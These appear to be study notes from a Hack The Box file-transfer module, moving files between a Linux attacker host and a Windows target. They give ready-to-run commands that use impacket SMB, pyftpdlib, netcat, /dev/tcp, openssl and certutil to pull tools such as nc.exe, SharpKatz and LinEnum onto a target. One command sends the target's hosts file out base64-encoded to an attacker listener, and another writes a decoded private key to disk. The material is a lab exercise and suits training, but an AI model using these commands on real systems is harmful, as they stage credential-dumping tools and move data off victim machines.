Decode a base64 input and write it into a file.

     [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1[...]URSBLRVktLS0tLQo="))

## SMB Server 
Create a SMB server with impacket in linux 

    sudo impacket-smbserver share -smb2support /tmp/smbshare

Download files in windows using this command 

    copy \\192.168.220.133\share\nc.exe

Sometimes newer version of windows block unauthenticated users, so we can add username and password to the server

    sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
In Windows: 

    net use n: \\192.168.220.133\share /user:test test

# FTP server 

In Linux using python creating an FTP server as follows : 

    sudo pip3 install pyftpdlib
    sudo python3 -m pyftpdlib --port 21

Transferring files with Windows powershell:

    (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
in Windows 
with powershell 

    PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

With CMD 
    C:\htb> echo open 192.168.49.128 > ftpcommand.txt
    C:\htb> echo USER anonymous >> ftpcommand.txt
    C:\htb> echo binary >> ftpcommand.txt
    C:\htb> echo GET file.txt >> ftpcommand.txt
    C:\htb> echo bye >> ftpcommand.txt
    C:\htb> ftp -v -n -s:ftpcommand.txt
    ftp> open 192.168.49.128
    Log in with USER and PASS first.
    ftp> USER anonymous

    ftp> GET file.txt
    ftp> bye

    C:\htb>more file.txt
    This is a test file

# NetCat
Another method from Windows to Linux is to use netcat 
In linux create nc 

    nc -nlcp 8000

and send a post method with the base64 files as a body with windows

    PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

    PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

    $ echo <base64> | base64 -d -w 0 > hosts

Send a file over nc 

    nc -q 0 192.168.49.128 8000 < SharpKatz.exe

to receive it 

    nc -l -p 8000 > SharpKatz.exe

or another method, send with nc

    sudo nc -l -p 443 -q 0 < SharpKatz.exe


Receive it with /dev/tcp

    cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe

## XFREERDP
to mount a file 
    
    xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
## OPENSSL

Create server with openssl 

    openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

to download the file 

    MysterPedro@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh

## Using certutil 

    certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe

